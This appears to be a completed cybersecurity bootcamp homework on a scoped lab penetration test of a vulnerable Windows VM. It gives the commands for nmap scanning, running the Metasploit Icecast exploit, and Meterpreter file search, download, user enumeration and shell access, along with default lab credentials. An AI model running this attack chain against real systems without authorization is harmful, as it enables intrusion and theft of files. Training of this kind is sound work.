## Homework 17: Penetration Test Engagement

In this activity, you will play the role of an independent penetration tester hired by GoodCorp Inc. to perform security tests against their CEO’s workstation.

- The CEO claims to have passwords that are long and complex and therefore unhackable.

- You are tasked with gaining access to the CEO's computer and using a Meterpreter session to search for two files that contain the strings `recipe` and `seceretfile`.

- The deliverable for this engagement will be in the form of a report labeled `Report.docx`.

#### Setup 

- Before you begin, we'll need to start the Icecast server to emulate the CEO's computer. 
  - Log onto the DVW10 machine (credentials `IEUser:Passw0rd!`) and wait for the Icecast application to popup.
  - Then click `Start Server`. 

#### Reminders

- A penetration tester's job is not just to gain access and find a file. Pentesters need to find all vulnerabilities, and document and report them to the client. It's quite possible that the CEO's workstation has multiple vulnerabilities.
 
- If a specific exploit doesn't work, that doesn't necessarily mean that the target service isn't vulnerable. It's possible that something could be wrong with the exploit script itself. Remember, not all exploit scripts are right for every situation.
 
#### Scope
 
- The scope of this engagement is limited to the CEO's workstation only. You are not permitted to scan any other IP addresses or exploit anything other than the CEO's IP address.
 
- The CEO has a busy schedule and cannot have the computer offline for an extended period of time. Therefore, denial of service and brute force attacks are prohibited. 
 
- After you gain access to the CEO’s computer, you may read and access any file, but you cannot delete them. Nor are you allowed to make any configurations changes to the computer.
 
- Since you've already been provided access to the network, OSINT won't be necessary.
 
#### Lab Environment
 
For this week's homework, please use the following VM setup:
 
- Attacking machine: Kali Linux `root:toor`
- Target machine: DVW10 `IEUser:Passw0rd!`

**NOTE**: You will need to login to the **DVW10** VM and start the `icecast` service prior to beginning this activity using the following procedure:

- After logging into DVW10, type "icecast" in the Cortana search box and hit **Enter**.
- The icecast application will launch.
- Click on **Start Server**.
- You are now ready to being the activity.

#### Deliverable

Once you complete this assignment, submit your findings in the following document: 

- [Report.docx](unit_17/homework/Resources/Report.docx)
 
### Instructions

You've been provided full access to the network and are getting ping responses from the CEO’s workstation.
 
1. Perform a service and version scan using Nmap to determine which services are up and running:

    - Run the Nmap command that performs a service and version scan against the target.

      > Answer: nmap -sV 192.168.0.20
 
 ![image](https://user-images.githubusercontent.com/96030770/166118761-cc4b365a-9051-4992-b84c-eb29107fa467.png)

 
2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
 
   - Run the SearchSploit commands to show available Icecast exploits.
  
     > Answer: searchsploit
 
 ![image](https://user-images.githubusercontent.com/96030770/166118783-468e7b58-4866-402b-acad-0a812d96d570.png)


3. Now that we know which exploits are available to us, let's start Metasploit:
 
   - Run the command that starts Metasploit:
    
     > Answer: msfconsole
 
 
4. Search for the Icecast module and load it for use.
 
   - Run the command to search for the Icecast module:
     
     > Answer: search icecast
 
 ![image](https://user-images.githubusercontent.com/96030770/166118815-682ac0eb-5570-4327-80b0-273a20c3c23e.png)


   - Run the command to use the Icecast module:

       **Note:** Instead of copying the entire path to the module, you can use the number in front of it.

     > Answer: use 0
 
![image](https://user-images.githubusercontent.com/96030770/166118834-09a90557-f691-404c-a9d6-4542c81ab043.png)


5. Set the `RHOST` to the target machine.
 
   - Run the command that sets the `RHOST`:
      
     > Answer: set RHOST 192.168.0.20

![image](https://user-images.githubusercontent.com/96030770/166118861-315f1723-dd0c-42af-b2ab-e1d628146ea9.png)

 
6. Run the Icecast exploit.
 
   - Run the command that runs the Icecast exploit.
      
     > Answer: exploit or run

![image](https://user-images.githubusercontent.com/96030770/166118875-3e495379-2035-4617-a91a-454d578854e9.png)

 
   - Run the command that performs a search for the `secretfile.txt` on the target.
      
     > Answer: search -f *secretfile.txt

![image](https://user-images.githubusercontent.com/96030770/166118922-1ef396d9-f715-4220-a74a-1e3f3092faea.png)

  
 7. You should now have a Meterpreter session open.
 
    - Run the command to performs a search for the `recipe.txt` on the target:

      > Answer: search -f *recipe.txt
 
 ![image](https://user-images.githubusercontent.com/96030770/166118954-d17c7698-2028-44c1-b1ff-189ff57bffde.png)

 
    - **Bonus**: Run the command that exfiltrates the `recipe*.txt` file:


      > Answer: download c:\\Users\\IEUser\\Documents\\Drink.recipe.txt
                download c:\\Users\\IEUser\\Documents\\user.secretfile.txt
                
                
 ![image](https://user-images.githubusercontent.com/96030770/166118963-5bdfa3cc-69bd-4d24-9878-f48c2f5b0818.png)


![image](https://user-images.githubusercontent.com/96030770/166118971-1a569452-febc-475f-960f-0a2cf9eb762e.png)


8. You can also use Meterpreter's local exploit suggester to find possible exploits.

 
   - **Note:** The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.

      > Answer: run post/multi/recon/local_exploit_suggester

![image](https://user-images.githubusercontent.com/96030770/166118994-004b3698-009d-4774-b059-8e14a7624cae.png)


#### Bonus
  
 
A. Run a Meterpreter post script that enumerates all logged on users.

  > Answer: run post/windows/gather/enum_logged_on_users
 
 ![image](https://user-images.githubusercontent.com/96030770/166119012-02229902-b0f8-4a30-9e64-5c995b54d9dc.png)

     
B. Open a Meterpreter shell. 
 
  > Answer: shell
 
 ![image](https://user-images.githubusercontent.com/96030770/166119018-8320ca20-0d98-448a-9daa-bd2fca25c57c.png)

 
C. Run the command that displays the target's computer system information:

   > Answer: sysinfo

![image](https://user-images.githubusercontent.com/96030770/166119031-95fa9a16-b2ca-40c4-983a-437d26751ca9.png)


---

&copy; 2020 Trilogy Education Services, a 2U Inc Brand.   All Rights Reserved.
